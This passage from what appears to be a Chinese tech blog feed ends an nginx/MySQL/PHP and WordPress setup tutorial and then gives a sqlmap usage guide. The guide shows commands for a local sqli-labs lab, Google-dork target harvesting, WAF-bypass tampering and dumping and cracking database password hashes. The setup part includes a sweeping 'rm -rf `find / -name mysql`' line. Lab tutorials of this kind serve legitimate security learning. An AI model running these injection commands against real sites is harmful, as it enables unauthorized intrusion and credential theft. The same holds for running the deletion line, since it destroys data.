install)则是最快的,它相当于以双击的方式运行二进制安装包,在编译 生成和安装三个阶段中,屏幕上会输出各式各样的信息,主要包含软件包的概要情况,当前系统的软件依赖关系,以及是否有条件及进行安装操作,但只要进程没有被强行终止,或是没有输出明显的报错信息,则都是正常情况.</p></li><li><p>安装完成后进入最终配置阶段,既然在编译环境中使用prefix参数指定了安装路径,那么nginx服务程序的配置文件一定在&#x2F;user&#x2F;local&#x2F;nginx目录中</p><p> 接下来修改&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf文件的第二行注释删除,然后再后面写上负责运行网站服务程序的账户名称和用户组名称,这里的就是由nginx用户及nginx用户组负责管理网站服务<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251325912.png" alt="image-20220325132523860"></p><p> 接着修改第45行的首页面文件名称,在里面添加index.php的文件.这个文件也是让用户浏览网站时第一眼看到的文件,也叫首页文件</p><p> 最后在删除65~71行前面的注释符#来启用虚拟主机功能,然后将第69行后面对应的网站根目录修改为&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;html,其中的fastcgi_script_name参数用于指代脚本名称,也就是用户请求的url.只有想你想填写正确了,才能使nginx服务正确解析用户请求,否则访问的页面会提示 “404 Not Found”错误</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251332618.png" alt="image-20220325133221548"></p></li><li><p>通过编译源码的方式安装的服务默认不能被systemctl命令所管理,而要使用nginx服务本身的管理工具进行操作,相应命令所在的目录时&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin.由于使用绝对路径的形式输入命令未免会太麻烦,建议将&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;sbin路径添加到PATH变量中,让bash解释器在后续执行命令时自动搜索到他,然后再source命令后加载配置文件,让参数立即生效.下来就只需要输入nginx命令即可启动网站服务了<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251338392.png" alt="image-20220325133834331"></p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251341542.png" alt="image-20220325134140481"></p></li></ol><h3 id="配置mysql服务"><a href="#配置mysql服务" class="headerlink" title="配置mysql服务"></a>配置mysql服务</h3><p>在使用软件仓库安装服务程序时,系统会自动根据RPM软件包中的指令集完成软件配置等工作,但是一旦选择使用源码包的方式来安装,这一切就需要自己来完成了.对于mysql数据库来说,我们需要在系统中创建一个mysql的用户,专门用于负责运行mysql数据库.要记住将这类用户的bash终端设置成nologin解释器</p><p>准备配置mysql服务</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251346865.png" alt="image-20220325134631818"></p><ol><li><p>解压mysql安装软件包,将解压出来的程序目录改名并移动到&#x2F;usr&#x2F;local目录下,对其进行初始化操作后便可使用,要注意的是以.tar.xz结尾的压缩包软件,不应用z参数进行解压<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251350791.png" alt="image-20220325135022743"></p></li><li><p>在生产环境中管理mysql数据库是,有两个比较常用的目录,一个是&#x2F;usr&#x2F;local&#x2F;mysql目录,这里用于保存mysql数据库程序文件的路径.还有一个就是&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;data目录,他用于存储数据库的具体内容,每个数据库的内容会被单独存放到一个目录内.对于实际数据库文件的data目录,用户需要先手动创建出来<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251354477.png" alt="image-20220325135436430"></p></li><li><p>初始化mysql服务程序,对目录进行授权,确保数据能够被mysql系统用户读取,在初始化阶段,应使用mysqld命令确认管理mysql数据库服务的用户名称 数据保存目录 及编码信息,在信息确认无误后开始进行初始化.在初始化最后阶段,系统会给用户分配一个初始化的临时密码(w+an-r3kGpuD)<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251358960.png" alt="image-20220325135815903"></p></li><li><p>与nginx服务相似,mysql数据库的二进制可执行命令也单独存放在自身的程序目录&#x2F;usr&#x2F;local&#x2F;mysql&#x2F;bin中.若每次在执行命令之前都要切换到这个目录,则有些麻烦,要加入到PATH变量中<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251402211.png" alt="image-20220325140200150"></p><p> 在这样设置之后,几遍返回到源码目录.也可以继续执行mysql数据库的管理命令.接着将启动脚本mysql.server放入带&#x2F;etc&#x2F;init.d目录中,让服务器每次重启后都能自动启动数据库,并给予可执行权限</p><p> libtinfo.so.5文件是mysql数据库在8.0版本后新添加的重要函数库文件,但默认不存在,需要将libtinfo.so.6.1文件复制过来或者作为链接文件才能正常启动<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251409442.png" alt="image-20220325140912391"></p></li><li><p>执行mysql数据库服务启动文件,并进行初始化工作,为了安全,mysql自8.0版本起不在允许用户使用临时密码来管理数据库内容,也不能进行远程控制,用户必须修改初始化密码后才能使用mysql数据库.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251431843.png" alt="image-20220325143136787"></p><p> 出现报错信息</p><p> <img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251433086.png" alt="image-20220325143301039"></p><p> 检查系统是否安装过mysql。</p> <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm格式安装的mysql卸载方式</span><br><span class="line"></span><br><span class="line">rpm -qa|grep -i mysql</span><br><span class="line"></span><br><span class="line">rpm -e mysql-5.1.47-4.el6.x86_64 –nodeps</span><br><span class="line"></span><br><span class="line">说明：-e参数表示删除 –nodeps表示不校验依赖关系</span><br><span class="line">主要卸载内容一般包括以下包</span><br><span class="line">mysql-5.1.47-4.el6.x86_64</span><br><span class="line">mysql-connector-odbc-5.1.5r1144-7.el6.x86_64</span><br><span class="line">mysql-libs-5.1.47-4.el6.x86_64</span><br><span class="line">mysql-devel-5.1.47-4.el6.x86_64</span><br><span class="line">mysql-server-5.1.47-4.el6.x86_64</span><br><span class="line"></span><br><span class="line">二进制包格式安装的mysql卸载</span><br><span class="line">#停掉mysql</span><br><span class="line">service mysql stop</span><br><span class="line">#查看状态</span><br><span class="line">service mysql status</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rm -rf `find / -name mysql`</span><br></pre></td></tr></table></figure><p> 之后重新安装<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251549533.png" alt="image-20220325154904459"></p><p> 但是这样还不行,需要切换到mysql数据库中,修改user表单的密码值<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251554322.png" alt="image-20220325155418264"></p><p> 先建立一个数据库<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251555995.png" alt="image-20220325155507947"></p></li></ol><h3 id="配置php服务"><a href="#配置php服务" class="headerlink" title="配置php服务"></a>配置php服务</h3><ol><li><p>解压php安装包软件并编译安装,在编译期间,需要使用profix参数指定安装路径,使用–with-mysqli等参数开启对数据库的支持模块,为后面的在线安装网站做好准备<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251558038.png" alt="image-20220325155858960"></p><p> 生成二进制文件并进行安装<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251558038.png"></p></li><li><p>将生成的php服务配置文件复制到安装目录中(&#x2F;usr&#x2F;local&#x2F;php),让其生效.现在主配置文件有了,接下来还需要php-fpm的配置文件,在&#x2F;usr&#x2F;local&#x2F;php&#x2F;etc&#x2F;目录中有提供,只需复制就好<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251601933.png" alt="image-20220325160156873"></p><p> 复制一个模板文件到php-fpm.d的目录中,用于后续控制网站的连接性能<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251602117.png" alt="image-20220325160239059"></p></li><li><p>把php服务加入到启动项中,使其重启后依然生效<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251603924.png" alt="image-20220325160318868"></p></li><li><p>由于php服务程序的配置参数会对web服务的运行环境造成影响,如果默认开启了一些不必要的高危功能(如允许用户在网页中执行linux命令).因此需要编辑phpini配置文件,在第310行的disable_functions参数后面加上要禁止的功能.下面推荐禁止的.<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251606164.png" alt="image-20220325160605094"></p></li><li><p>开启php服务<img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251606335.png" alt="image-20220325160636276"></p></li></ol><h3 id="搭建wordpress博客"><a href="#搭建wordpress博客" class="headerlink" title="搭建wordpress博客"></a>搭建wordpress博客</h3><p>为了检验lnmp动态网站架构环境是否配置妥当,可以在上面部署wordpress博客系统,然后查看效果.如果能在lnmp动态网站环境中成功安装并使用wordpress网站系统,也就意味着这套机构是可以使用的.</p><p>把nginx服务程序根目录的内容清空后,将wordpress解压后的文件复制进去</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251617389.png" alt="image-20220325161718333"></p><p>为了能够让网站文件被Nginx服务程序顺利读取，应设置目录所有权的身份及可读写的权限</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251617125.png" alt="image-20220325161732077"></p><p>启动nginx服务,打开本机ip</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251620146.png" alt="image-20220325162055068"></p><p>单击图20-4中的“现在就开始”按钮，在随后出现的界面中依次输入刚刚建立的数据库名称、用户名及重置过的密码值。由于WordPress会要求用户自行创建好数据库，因此请确保网页中填写的数据库名称与刚才创建的一致，</p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251621714.png" alt="image-20220325162152640"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251623089.png" alt="image-20220325162339012"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203251624814.png" alt="image-20220325162420730"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap使用</title>
      <link href="/ctf/sql/sql-sqlmap%E4%BD%BF%E7%94%A8/"/>
      <url>/ctf/sql/sql-sqlmap%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap使用"><a href="#sqlmap使用" class="headerlink" title="sqlmap使用"></a>sqlmap使用</h1><h2 id="看到sql发送的测试payload"><a href="#看到sql发送的测试payload" class="headerlink" title="看到sql发送的测试payload"></a>看到sql发送的测试payload</h2><p>sqlmap对一个点是进行了怎样的尝试和读取数据的可以使用-v参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0、只显示python错误以及严重的信息。</span><br><span class="line">1、同时显示基本信息和警告信息。（默认）</span><br><span class="line">2、同时显示debug信息。</span><br><span class="line">3、同时显示注入的payload。</span><br><span class="line">4、同时显示HTTP请求。</span><br><span class="line">5、同时显示HTTP响应头。</span><br><span class="line">6、同时显示HTTP响应页面。</span><br></pre></td></tr></table></figure><p>如果想要看到sql发送的测试payload最好的等级就是3</p><h2 id="获取目标方式"><a href="#获取目标方式" class="headerlink" title="获取目标方式"></a>获取目标方式</h2><h3 id="目标url"><a href="#目标url" class="headerlink" title="目标url"></a>目标url</h3><p><strong>-u参数</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-2/?id=1  --batch</span><br></pre></td></tr></table></figure><h3 id="从文件中加载http请求"><a href="#从文件中加载http请求" class="headerlink" title="从文件中加载http请求"></a>从文件中加载http请求</h3><p><strong>-r参数</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232208283.png" alt="image-20220323220812216"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -r C:\Users\14980\Desktop\1.php --batch</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232209505.png" alt="image-20220323220907435"></p><h3 id="从burp代理中获取日志"><a href="#从burp代理中获取日志" class="headerlink" title="从burp代理中获取日志"></a>从burp代理中获取日志</h3><p><strong>-i</strong></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232132536.png" alt="image-20220323213215450"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232132557.png" alt="image-20220323213235481"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232133038.png" alt="image-20220323213319979"></p><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232133133.png" alt="image-20220323213334072"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l D:\Download\test.log --batch</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203232208513.png" alt="image-20220323220833445"></p><h3 id="处理谷歌的搜索请求"><a href="#处理谷歌的搜索请求" class="headerlink" title="处理谷歌的搜索请求"></a>处理谷歌的搜索请求</h3><p><strong>-g</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;  --proxy=&quot;http://127.0.0.1:7890&quot; --batch</span><br></pre></td></tr></table></figure><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><h3 id="http参数"><a href="#http参数" class="headerlink" title="http参数"></a>http参数</h3><p><strong>-data</strong></p><p>此参数是把数据以POST方式提交，sqlmap会像检测GET参数一样检测POST的参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-11/ --data=&quot;uname=admin&amp;passwd=Dumb&amp;submit=Submit&quot; --batch</span><br></pre></td></tr></table></figure><h3 id="HTTP-cookie头"><a href="#HTTP-cookie头" class="headerlink" title="HTTP cookie头"></a>HTTP cookie头</h3><p><strong>–cookie,–load-cookies,–drop-set-cookie</strong></p><p>1、web应用需要登陆的时候。<br>2、你想要在这些头参数中测试SQL注入时。<br>可以通过抓包把cookie获取到，复制出来，然后加到–cookie参数里。<br>在HTTP请求中，遇到Set-Cookie的话，sqlmap会自动获取并且在以后的请求中加入，并且会尝试SQL注入。<br>如果你不想接受Set-Cookie可以使用–drop-set-cookie参数来拒接。<br>当你使用–cookie参数时，当返回一个Set-Cookie头的时候，sqlmap会询问你用哪个cookie来继续接下来的请求。当–level的参数设定为2或者2以上的时候，sqlmap会尝试注入Cookie参数</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-20/index.php --cookie &quot;uname=Dumb&quot; --batch --level 2</span><br></pre></td></tr></table></figure><h3 id="HTTP-S-代理"><a href="#HTTP-S-代理" class="headerlink" title="HTTP(S)代理"></a>HTTP(S)代理</h3><p><strong>–proxy,–proxy-cred和–ignore-proxy</strong></p><p>使用–proxy代理是格式为：<a href="http://url:port。当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。--ignore-proxy拒绝使用本地局域网的HTTP(S)代理">http://url:port。当HTTP(S)代理需要认证是可以使用--proxy-cred参数：username:password。--ignore-proxy拒绝使用本地局域网的HTTP(S)代理</a></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -g &quot;inurl:\&quot;.php?id=1\&quot;&quot;  --proxy=&quot;http://127.0.0.1:7890&quot; --batch</span><br></pre></td></tr></table></figure><h3 id="HTTP-User-Agent头"><a href="#HTTP-User-Agent头" class="headerlink" title="HTTP User-Agent头"></a>HTTP User-Agent头</h3><p><strong>–user-agent,–random-agent</strong></p><p>默认情况下sqlmap的HTTP请求头中User-Agent值是：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap/1.0-dev-xxxxxxx (http://sqlmap.org)</span><br></pre></td></tr></table></figure><p> 可以使用–user-agent参数来修改，同时也可以使用–random-agent参数来随机的从.&#x2F;txt&#x2F;user-agents.txt中获取.当–level参数设定为3或者3以上的时候，会尝试对User-Angent进行注入。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-18/index.php --data &quot;uname=Dumb,passwd=Dumb&quot; --user-agent &quot; Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36&quot; --batch --level 3</span><br></pre></td></tr></table></figure><h3 id="HTTP-Referer头"><a href="#HTTP-Referer头" class="headerlink" title="HTTP Referer头"></a>HTTP Referer头</h3><p><strong>–referer</strong></p><p>sqlmap可以在请求中伪造HTTP中的referer，当–level参数设定为3或者3以上的时候会尝试对referer注入</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-19/ --data &quot;uname=Dumb,passwd=Dumb&quot; --referer &quot;http://127.0.0.1/sqlilabs/Less-19/&quot; --batch --level 3</span><br></pre></td></tr></table></figure><h3 id="额外的HTTP头"><a href="#额外的HTTP头" class="headerlink" title="额外的HTTP头"></a>额外的HTTP头</h3><p><strong>–headers</strong></p><p>可以通过–headers参数来增加额外的http头</p><h3 id="设定超时时间"><a href="#设定超时时间" class="headerlink" title="设定超时时间"></a>设定超时时间</h3><p><strong>–timeout</strong></p><p>可以设定一个HTTP(S)请求超过多久判定为超时，10.5表示10.5秒，默认是30秒。</p><h3 id="设定重试超时"><a href="#设定重试超时" class="headerlink" title="设定重试超时"></a>设定重试超时</h3><p><strong>–retries</strong></p><p>当HTTP(S)超时时，可以设定重新尝试连接次数，默认是3次。</p><h3 id="设定随机改变的参数值"><a href="#设定随机改变的参数值" class="headerlink" title="设定随机改变的参数值"></a>设定随机改变的参数值</h3><p><strong>–randomize</strong></p><p>可以设定某一个参数值在每一次请求中随机的变化，长度和类型会与提供的初始值一样。</p><h3 id="利用正则过滤目标网址"><a href="#利用正则过滤目标网址" class="headerlink" title="利用正则过滤目标网址"></a>利用正则过滤目标网址</h3><p><strong>–scope</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -l burp.log --scope=&quot;(www)?\.target\.(com|net|org)&quot;</span><br></pre></td></tr></table></figure><h3 id="避免过多的错误请求被屏蔽"><a href="#避免过多的错误请求被屏蔽" class="headerlink" title="避免过多的错误请求被屏蔽"></a>避免过多的错误请求被屏蔽</h3><p><strong>–safe-url,–safe-freq</strong></p><p>有的web应用程序会在你多次访问错误的请求时屏蔽掉你以后的所有请求，这样在sqlmap进行探测或者注入的时候可能造成错误请求而触发这个策略，导致以后无法进行。</p><p>绕过这个策略有两种方式：</p><ol><li>–safe-url：提供一个安全不错误的连接，每隔一段时间都会去访问一下。</li><li>–safe-freq：提供一个安全不错误的连接，每次测试请求之后都会再访问一边安全连接。</li></ol><h3 id="关掉URL参数值编码"><a href="#关掉URL参数值编码" class="headerlink" title="关掉URL参数值编码"></a>关掉URL参数值编码</h3><p><strong>–skip-urlencode</strong></p><p>根据参数位置，他的值默认将会被URL编码，但是有些时候后端的web服务器不遵守RFC标准，只接受不经过URL编码的值，这时候就需要用–skip-urlencode参数。</p><h3 id="每次请求时候执行自定义的python代码"><a href="#每次请求时候执行自定义的python代码" class="headerlink" title="每次请求时候执行自定义的python代码"></a>每次请求时候执行自定义的python代码</h3><p><strong>–eval</strong></p><p>在有些时候，需要根据某个参数的变化，而修改另个一参数，才能形成正常的请求，这时可以用–eval参数在每次请求时根据所写python代码做完修改后请求。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php?id=1&amp;hash=c4ca4238a0b923820dcc509a6f75849b&quot; --eval=&quot;import hashlib;hash=hashlib.md5(id).hexdigest()&quot;</span><br></pre></td></tr></table></figure><p>上面的请求就是每次请求时根据id参数值，做一次md5后作为hash参数的值。</p><h3 id="HTTP请求延迟"><a href="#HTTP请求延迟" class="headerlink" title="HTTP请求延迟"></a>HTTP请求延迟</h3><p><strong>–delay</strong></p><p>可以设定两个HTTP(S)请求间的延迟，设定为0.5的时候是半秒，默认是没有延迟的。</p><h3 id="HTTP认证保护"><a href="#HTTP认证保护" class="headerlink" title="HTTP认证保护"></a>HTTP认证保护</h3><p><strong>参数：–auth-type,–auth-cred</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">这些参数可以用来登陆HTTP的认证保护支持三种方式</span><br><span class="line">1、Basic</span><br><span class="line">2、Digest</span><br><span class="line">3、NTLM</span><br></pre></td></tr></table></figure><h3 id="HTTP协议的证书认证"><a href="#HTTP协议的证书认证" class="headerlink" title="HTTP协议的证书认证"></a>HTTP协议的证书认证</h3><p><strong>–auth-cert</strong></p><p>当Web服务器需要客户端证书进行身份验证时，需要提供两个文件:key_file，cert_file。key_file是格式为PEM文件，包含着你的私钥，cert_file是格式为PEM的连接文件。</p><h3 id="参数拆分字符"><a href="#参数拆分字符" class="headerlink" title="参数拆分字符"></a>参数拆分字符</h3><p><strong>–param-del</strong></p><p>当GET或POST的数据需要用其他字符分割测试参数的时候需要用到此参数。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://www.target.com/vuln.php&quot; --data=&quot;query=foobar;id=1&quot; --param-del=&quot;;&quot; -f --banner --dbs --users</span><br></pre></td></tr></table></figure><h2 id="注入"><a href="#注入" class="headerlink" title="注入"></a>注入</h2><h3 id="指定参数"><a href="#指定参数" class="headerlink" title="指定参数"></a>指定参数</h3><p><strong>-p,–skip,</strong>*</p><p>sqlmap默认测试所有的GET和POST参数，当–level的值大于等于2的时候也会测试HTTP  Cookie头的值，当大于等于3的时候也会测试User-Agent和HTTP  Referer头的值。但是你可以手动用-p参数设置想要测试的参数。例如： -p “id,user-anget”,当你使用–level的值很大但是有个别参数不想测试的时候可以使用–skip参数。例如：–skip&#x3D;”user-angent.referer”</p><p>在有些时候web服务器使用了URL重写，导致无法直接使用sqlmap测试参数，可以在想测试的参数后面加*</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://127.0.0.1/param1/value1*/param2/value2/&quot;</span><br></pre></td></tr></table></figure><p>sqlmap将会测试value1的位置是否可注入。</p><h3 id="指定数据库"><a href="#指定数据库" class="headerlink" title="指定数据库"></a>指定数据库</h3><p><strong>–dbms</strong></p><p>默认情况系sqlmap会自动的探测web应用后端的数据库是什么，sqlmap支持的数据库有：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">MySQL、Oracle、PostgreSQL、Microsoft SQL Server、Microsoft Access、SQLite、Firebird、Sybase、SAP MaxDB、DB2</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --dbms mysql --batch</span><br></pre></td></tr></table></figure><h3 id="指定数据库服务系统"><a href="#指定数据库服务系统" class="headerlink" title="指定数据库服务系统"></a>指定数据库服务系统</h3><p><strong>–os</strong></p><p>默认情况下sqlmap会自动的探测数据库服务器系统，支持的系统有：Linux、Windows。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --os windows --batch</span><br></pre></td></tr></table></figure><h3 id="注入payload"><a href="#注入payload" class="headerlink" title="注入payload"></a>注入payload</h3><p><strong>–prefix,–suffix</strong></p><p>代码中是这样调用数据库的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’&quot; . $_GET[’id’] . &quot;’) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure><p>这时你就需要–prefix和–suffix参数了：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u &quot;http://192.168.136.131/sqlmap/mysql/get_str_brackets.php?id=1&quot; -p id --prefix &quot;’)&quot; --suffix &quot;AND (’abc’=’abc&quot;</span><br></pre></td></tr></table></figure><p>这样执行的SQL语句变成：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$query = &quot;SELECT * FROM users WHERE id=(’1’) &lt;PAYLOAD&gt; AND (’abc’=’abc’) LIMIT 0, 1&quot;;</span><br></pre></td></tr></table></figure><h3 id="修改注入的数据"><a href="#修改注入的数据" class="headerlink" title="修改注入的数据"></a>修改注入的数据</h3><p><strong>–tamper</strong></p><p>可以使用–tamper参数对数据做修改来绕过WAF等</p><h2 id="探测"><a href="#探测" class="headerlink" title="探测"></a>探测</h2><h3 id="探测等级"><a href="#探测等级" class="headerlink" title="探测等级"></a>探测等级</h3><p><strong>–level</strong></p><p>共有五个等级，默认为1，sqlmap使用的payload可以在xml&#x2F;payloads.xml中看到，你也可以根据相应的格式添加自己的payload。这个参数不仅影响使用哪些payload同时也会影响测试的注入点，GET和POST的数据都会测试，HTTP Cookie在level为2的时候就会测试，HTTP User-Agent&#x2F;Referer头在level为3的时候就会测试。总之在你不确定哪个payload或者参数为注入点的时候，为了保证全面性，建议使用高的level值。</p><h3 id="风险等级"><a href="#风险等级" class="headerlink" title="风险等级"></a>风险等级</h3><p><strong>–risk</strong></p><p>共有四个风险等级，默认是1会测试大部分的测试语句，2会增加基于事件的测试语句，3会增加OR语句的SQL注入测试。在有些时候，例如在UPDATE的语句中，注入一个OR的测试语句，可能导致更新的整个表，可能造成很大的风险。</p><h3 id="页面比较"><a href="#页面比较" class="headerlink" title="页面比较"></a>页面比较</h3><p><strong>–string,–not-string,–regexp,–code</strong></p><p>默认情况下sqlmap通过判断返回页面的不同来判断真假，但有时候这会产生误差，因为有的页面在每次刷新的时候都会返回不同的代码，比如页面当中包含一个动态的广告或者其他内容，这会导致sqlmap的误判。此时用户可以提供一个字符串或者一段正则匹配，在原始页面与真条件下的页面都存在的字符串，而错误页面中不存在（使用–string参数添加字符串，–regexp添加正则），同时用户可以提供一段字符串在原始页面与真条件下的页面都不存在的字符串，而错误页面中存在的字符串（–not-string添加）。用户也可以提供真与假条件返回的HTTP状态码不一样来注入，例如，响应200的时候为真，响应401的时候为假，可以添加参数–code&#x3D;200。</p><p><strong>–text-only,–titles</strong></p><p>有些时候用户知道真条件下的返回页面与假条件下返回页面是不同位置在哪里可以使用–text-only（HTTP响应体中不同）–titles（HTML的title标签中不同）。</p><h2 id="注入技术"><a href="#注入技术" class="headerlink" title="注入技术"></a>注入技术</h2><h3 id="测试是否是注入"><a href="#测试是否是注入" class="headerlink" title="测试是否是注入"></a>测试是否是注入</h3><p><strong>–technique</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --technique &quot;BEQSTU&quot; --batch</span><br></pre></td></tr></table></figure><h3 id="设定延迟注入的时间"><a href="#设定延迟注入的时间" class="headerlink" title="设定延迟注入的时间"></a>设定延迟注入的时间</h3><p><strong>–time-sec</strong></p><p>当使用继续时间的盲注时，时刻使用–time-sec参数设定延时时间，默认是5秒。</p><h3 id="二阶SQL注入"><a href="#二阶SQL注入" class="headerlink" title="二阶SQL注入"></a>二阶SQL注入</h3><p><strong>–second-order</strong></p><p>有些时候注入点输入的数据看返回结果的时候并不是当前的页面，而是另外的一个页面，这时候就需要你指定到哪个页面获取响应判断真假。–second-order后门跟一个判断页面的URL地址。</p><h2 id="列数据"><a href="#列数据" class="headerlink" title="列数据"></a>列数据</h2><h3 id="版本号"><a href="#版本号" class="headerlink" title="版本号"></a>版本号</h3><p><strong>-b,–banner</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -b --batch</span><br></pre></td></tr></table></figure><h3 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h3><p><strong>-current-user</strong></p><p>在大多数据库中可以获取到管理数据的用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 -current-user --batch</span><br></pre></td></tr></table></figure><h3 id="当前数据库"><a href="#当前数据库" class="headerlink" title="当前数据库"></a>当前数据库</h3><p><strong>–current-db</strong></p><p>返还当前连接的数据库。</p><h3 id="当前用户是否为管理员"><a href="#当前用户是否为管理员" class="headerlink" title="当前用户是否为管理员"></a>当前用户是否为管理员</h3><p><strong>–is-dba</strong></p><p>判断当前的用户是否为管理，是的话会返回True。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --is-dba --batch</span><br></pre></td></tr></table></figure><h3 id="列数据库管理用户"><a href="#列数据库管理用户" class="headerlink" title="列数据库管理用户"></a>列数据库管理用户</h3><p><strong>–users</strong></p><p>当前用户有权限读取包含所有用户的表的权限时，就可以列出所有管理用户。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --users --batch</span><br></pre></td></tr></table></figure><h3 id="列出并破解数据库用户的hash"><a href="#列出并破解数据库用户的hash" class="headerlink" title="列出并破解数据库用户的hash"></a>列出并破解数据库用户的hash</h3><p><strong>–passwords</strong></p><p>当前用户有权限读取包含用户密码的彪的权限时，sqlmap会现列举出用户，然后列出hash，并尝试破解。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python sqlmap.py -u http://127.0.0.1/sqlilabs/Less-1/?id=1 --passwords --batch</span><br></pre></td></tr></table></figure><p><img src="https://wanan-1310031509.cos.ap-beijing.myqcloud.com/202203241418046.png" alt="image-20220324141848955"></p><p>也可以提供-U参数来指定爆破哪个用户的hash。</p><h3 id="列出数据库管理员权限"><a href="#列出数据库管理员权限" 